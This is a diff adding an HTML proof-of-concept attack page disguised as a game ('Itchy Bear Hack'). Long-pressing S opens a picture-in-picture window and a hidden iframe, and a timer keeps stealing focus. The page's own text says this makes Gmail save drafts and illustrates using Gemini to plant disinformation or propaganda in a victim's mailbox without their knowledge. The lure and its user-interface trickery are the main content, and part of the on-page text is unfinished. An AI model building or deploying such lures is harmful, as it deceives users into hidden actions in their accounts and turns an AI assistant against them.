@@ -1,0 +1,102 @@
+
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Itchy Bear Hack</title>
+
+<style>
+
+:-webkit-autofill {
+  width: 20px;
+}
+
+        body {
+			background-color: lightblue;
+        }
+
+        .bear {
+		    width:auto;
+            height:80%;
+            background: lightblue url("itchy-bear.gif") no-repeat fixed center;
+            animation: bounce 0.5s;
+            animation-direction: alternate;
+            animation-timing-function: cubic-bezier(.5, 0.05, 1, .5);
+            animation-iteration-count: infinite;
+        }
+
+        @keyframes bounce {
+            from {
+                transform: translate3d(0, 0, 0);
+            }
+
+            to {
+                transform: translate3d(0, 200px, 0);
+            }
+        }
+
+        /* Prefix Support */
+
+        bear {
+            -webkit-animation-name: bounce;
+            -webkit-animation-duration: 0.5s;
+            -webkit-animation-direction: alternate;
+            -webkit-animation-timing-function: cubic-bezier(.5, 0.05, 1, .5);
+            -webkit-animation-iteration-count: infinite;
+        }
+
+        @-webkit-keyframes bounce {
+            from {
+                -webkit-transform: translate3d(0, 0, 0);
+                transform: translate3d(0, 0, 0);
+            }
+
+            to {
+                -webkit-transform: translate3d(0, 200px, 0);
+                transform: translate3d(0, 200px, 0);
+            }
+        }
+
+</style>
+
+</head>
+<body>
+
+	    <div id="bear" class="bear"></div>
+		</br></br></br>
+		<div style="justify-content:center;">
+		<h2>
+		 Itchy Bear has a 🐞 in her bum, long press S to help her scrab it off! 
+         Press Space Bar to 
+		 </h2>
+		 </div>
+ 
+	<h2>That's it! The Gmail window should close after 6 seconds, thereby saving the email as draft!</h2>
+
+	<p>Ideally, we can create several draft emails by launching multiple gmail compose windows periodically. This is just a simple illustration to show how Gemini can be used to spread disinformation or propaganda using draft emails that the victim is not aware of. Worth noting that the responses are persistent after drafts are deleted.</p>	
+
+<iframe id="ifr" src="_blank" width="1%" height="1%" style="display:none;"></iframe>
+
+
+<script>
+
+var isWindowOpened = false;
+  
+document.onkeydown = function(e) {
+  if(e.key == "s" && !isWindowOpened){
+  window.documentPictureInPicture.requestWindow();
+  
+  document.getElementById("ifr").src = "window.html";
+  document.getElementById("ifr").style.display = "";
+  isWindowOpened = true;
+  }
+}
+
+ setInterval(function(){
+ window.focus();
+ }, 200);
+  
+</script>
+
+</body>
+</html>
